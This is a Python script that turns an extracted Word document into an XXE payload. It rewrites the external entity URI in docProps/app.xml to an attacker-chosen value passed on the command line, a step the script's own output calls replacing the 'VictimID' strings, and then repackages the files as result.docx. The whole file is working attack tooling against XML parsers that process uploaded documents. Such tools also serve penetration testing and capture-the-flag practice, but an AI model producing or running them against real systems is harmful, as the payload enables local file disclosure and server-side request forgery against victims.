#!/usr/bin/python
import sys
import re
import shutil
import os

if len(sys.argv) != 2:
    print("Missing argv[1]\n")
    sys.exit(1)

app_xml_path = "extract/extracted_files/docProps/app.xml"
dest_dir = "extract/temp_doc/docProps"
dest_path = os.path.join(dest_dir, "app.xml")
string_argv = sys.argv[1]

print("Reading the app.xml file...\n")

with open(app_xml_path, "r") as app_xml_file:
    app_xml_content = app_xml_file.read()

print(app_xml_content)

new_xxe_value = f'<!ENTITY xxe SYSTEM "{string_argv}" >'
modified_content = re.sub(r'<!ENTITY xxe SYSTEM ".*?" >', new_xxe_value, app_xml_content)

print("Replacing the VictimID strings...")

with open(app_xml_path, "w") as app_xml_file:
    app_xml_file.write(modified_content)

print("Modified content written to app.xml")
os.makedirs(dest_dir, exist_ok=True)

shutil.copy(app_xml_path, dest_path)
print(f"Copied app.xml to {dest_path}")

# Zipppppage
zip_path = "result"
shutil.make_archive(zip_path, 'zip', 'extract/extracted_files')
print(f"Created archive {zip_path}.zip")

# .zip -> .docx
docx_path = "result.docx"
os.rename(f"{zip_path}.zip", docx_path)
print(f"Renamed archive to {docx_path}")